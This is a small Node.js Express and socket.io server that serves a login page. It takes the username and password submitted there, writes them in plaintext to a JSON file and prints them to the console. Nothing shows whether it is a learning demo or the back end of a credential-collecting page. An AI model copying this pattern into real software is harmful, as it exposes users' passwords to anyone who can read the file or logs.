const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server);

// load images and stylesheets inside the webpage
// removing it results in loading the raw HTML file
app.use(express.static(__dirname));

app.get("/", (request, response) => {
  response.sendFile(__dirname + "/loginpage.html");
});

server.listen(3000, () => {
  console.log("listening on *: 3000");
});

io.on("connection", (socket) => {
  socket.on("output", (user, pass) => {
    //console.log(login);
    const obj = {
      username: user,
      password: pass,
    };

    var objString = JSON.stringify(obj);
    var fs = require("fs");
    fs.writeFile("storeInputs.json", objString, function (err, result) {
      if (err) console.log("error", err);
    });
    console.log(JSON.stringify(obj, null, 2));
  });
  //console.log("a user conneced");
});
